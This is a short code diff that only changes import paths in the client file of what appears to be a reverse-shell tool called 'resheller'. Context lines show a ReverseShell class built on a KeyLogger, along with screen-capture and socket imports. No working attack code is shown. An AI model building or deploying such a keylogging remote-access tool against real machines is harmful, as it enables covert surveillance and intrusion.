@@ -11,10 +11,10 @@ from typing import Union
 from mss import mss
 from requests import get
 
-from lib.pipe import SafeSocket
-from lib.stdout import usage
-from src.client.ip import get_ip
-from src.client.keylogger import KeyLogger
+from resheller.lib.pipe import SafeSocket
+from resheller.lib.stdout import usage
+from resheller.src.client.ip import get_ip
+from resheller.src.client.keylogger import KeyLogger
 
 
 class ReverseShell(KeyLogger):
